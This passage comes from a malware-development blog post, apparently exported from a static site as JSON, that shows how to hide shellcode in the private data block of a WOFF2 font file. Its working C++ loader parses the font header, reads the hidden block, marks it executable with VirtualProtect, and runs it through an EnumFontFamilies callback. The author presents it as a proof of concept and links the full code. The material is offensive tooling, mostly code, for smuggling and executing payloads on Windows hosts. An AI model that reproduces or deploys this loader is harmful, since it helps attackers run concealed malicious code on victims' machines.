Header:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#pragma pack(push, 1)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eWOFF2_Header\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e signature;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e flavor;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e length;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint16_t\u003c/span\u003e numTables;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint16_t\u003c/span\u003e reserved;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e totalSfntSize;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e totalCompressedSize;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint16_t\u003c/span\u003e majorVersion;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint16_t\u003c/span\u003e minorVersion;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e metaOffset;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e metaLength;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e metaOrigLength;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e privOffset;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e privLength;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e};\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#pragma pack(pop)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThe \u003ccode\u003epragma\u003c/code\u003e directives are used to avoid potential padding that would shift the data read into our Header.\u003c/p\u003e\n\u003cp\u003eHere is the function that reads the private data block to extract the shellcode:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBOOL \u003cspan style=\"color:#a6e22e\"\u003eread_private_data_block\u003c/span\u003e(string \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003ewoff2_file) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  WOFF2_Header header;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ifstream file(woff2_file, ios\u003cspan style=\"color:#f92672\"\u003e::\u003c/span\u003ebinary \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e ios\u003cspan style=\"color:#f92672\"\u003e::\u003c/span\u003eate);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003efile) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e runtime_error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[!] Impossible to open the WOFF2 file\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  streamsize size \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e file.tellg();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  file.seekg(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, ios\u003cspan style=\"color:#f92672\"\u003e::\u003c/span\u003ebeg);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003efile.read(\u003cspan style=\"color:#66d9ef\"\u003ereinterpret_cast\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u0026gt;\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003eheader), \u003cspan style=\"color:#66d9ef\"\u003esizeof\u003c/span\u003e(WOFF2_Header))) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e runtime_error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[!] Impossible to read the Header\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (ntohl(header.signature) \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x774f4632\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    cerr \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[!] Bad magic\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  file.seekg(ntohl(header.privOffset), ios\u003cspan style=\"color:#f92672\"\u003e::\u003c/span\u003ebeg);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003efile) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e runtime_error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[!] Invalid Offset\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  private_data_block.resize(ntohl(header.privLength));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003efile.read(\u003cspan style=\"color:#66d9ef\"\u003ereinterpret_cast\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u0026gt;\u003c/span\u003e(private_data_block.data()), (\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)ntohl(header.privLength))) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e runtime_error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[!] Impossible to read private data block\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e FALSE;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  file.close();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e TRUE;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"execute-the-shellcode\"\u003eExecute the shellcode\u003c/h2\u003e\n\u003cp\u003eTo execute our shellcode we will use the \u003ccode\u003eEnumFontFamilies\u003c/code\u003e function which simply lists the fonts available on a machine.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eEnumFontFamiliesA\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  [in] HDC           hdc,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  [in] LPCSTR        lpLogfont,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  [in] FONTENUMPROCA lpProc,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  [in] LPARAM        lParam\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eIt takes the following parameters:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ehdc\u003c/code\u003e  a handle to the device context, which can be obtained via \u003ccode\u003eGetDC\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003elpLogFont\u003c/code\u003e  a pointer to a string specifying the font family to enumerate. Here we will use \u003ccode\u003eNULL\u003c/code\u003e, because we want to enumerate all fonts.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003elpProc\u003c/code\u003e  a pointer to a callback function which will be executed by \u003ccode\u003eEnumFontFamilies\u003c/code\u003e; this callback will be responsible for executing our shellcode.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003elParam\u003c/code\u003e  a pointer to data that will be passed to the callback function.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eHere is the callback function that will be used to execute our shellcode:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBOOL CALLBACK \u003cspan style=\"color:#a6e22e\"\u003eEnumFamCallBack\u003c/span\u003e(LPLOGFONT lplf, LPNEWTEXTMETRIC lpntm, DWORD FontType, LPVOID aFontCount) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    DWORD oldProtect;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    cout \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[+] Enter Callback\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e endl;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (VirtualProtect(private_data_block.data(), private_data_block.size(), PAGE_EXECUTE_READWRITE, \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003eoldProtect)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eauto\u003c/span\u003e entry \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e) ())private_data_block.data();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        entry();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        cout \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[+] Trigger received. Execute Payload...\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e endl;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e TRUE;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThis loader is a POC so I do not guarantee it can bypass AV/EDR. As you can see I use the PAGE_EXECUTE_READWRITE permissions which are not recommended for a functional loader because they are directly detected by security solutions.\u003c/p\u003e\n\u003cp\u003eYou can find the complete loader code on my GitHub: \u003ca href=\"https://github.com/0xl0key\"\u003ehttps://github.com/0xl0key\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"demonstration\"\u003eDemonstration\u003c/h2\u003e\n\u003cp\u003eGeneration of the WOFF2 file armed with the shellcode:\u003cbr\u003e\n\u003cimg src=\"generate.png\" alt=\"generate\"\u003e\nHere the woff2 file is in the same directory as the loader:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"step_1.png\" alt=\"step_1\"\u003e\n\u003cimg src=\"final.png\" alt=\"final\"\u003e\nThank you for reading! I hope this POC can be useful to you!\u003c/p\u003e\n\u003cp\u003eSources:\u003cbr\u003e\n\u003ca href=\"https://w3c.github.io/woff/woff2/\"\u003ehttps://w3c.github.io/woff/woff2/\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"https://learn.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumfontfamiliesa\"\u003ehttps://learn.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumfontfamiliesa\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/fonttools/fonttools\"\u003ehttps://github.com/fonttools/fonttools\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"https://learn.microsoft.com/fr-fr/cpp/preprocessor/pack?view=msvc-170\"\u003ehttps://learn.microsoft.com/fr-fr/cpp/preprocessor/pack?view=msvc-170\u003c/a\u003e\u003c/p\u003e\n","date":"2025-10-12","dateFormatted":"2025.10.12","excerpt":"\u003cp\u003eWe will see how the WOFF2 format can be abused to host shellcode and how the WinAPI, through its font-handling functions, can be leveraged to trigger its execution.\u003c/p\u003e\n\u003ch2 id=\"overview-of-woff2\"\u003eOverview of WOFF2\u003c/h2\u003e\n\u003cp\u003eWOFF2 is a file \u003c/p\u003e","featured":null,"mood":null,"permalink":"http://localhost:1313/posts/woff2/","readingTime":5,"slug":"index","subtitle":null,"summary":"\u003cp\u003eWe will see how the WOFF2 format can be abused to host shellcode and how the WinAPI, through its font-handling functions, can be leveraged to trigger its execution.\u003c/p\u003e\n\u003ch2 id=\"overview-of-woff2\"\u003eOverview of WOFF2\u003c/h2\u003e\n\u003cp\u003eWOFF2 is a file format proposed by Google in 2013 to replace the WOFF1 format. It provides better compression of font data for use in CSS.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSupports OpenType and TrueType (SFNT) specifications\u003c/li\u003e\n\u003cli\u003eUses the Brotli compression algorithm\u003c/li\u003e\n\u003cli\u003ePrimarily developed for the Web to enable faster page loading\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"woff2-structure\"\u003eWOFF2 structure\u003c/h3\u003e\n\u003cp\u003eWOFF2 is composed of several blocks. A header that lets you navigate the file format. The other blocks contain the data necessary to define the font. The block that interests us is Private Data. This is an optional block that allows the font author to include whatever information they want; it can contain ASCII, Unicode text, or raw data, provided those data do not interfere with font loading.\u003c/p\u003e","tags":["maldev"],"title":"Weaponizing Font Policies for Payload Embedding ","url":"http://localhost:1313/posts/woff2/","wordCount":884}]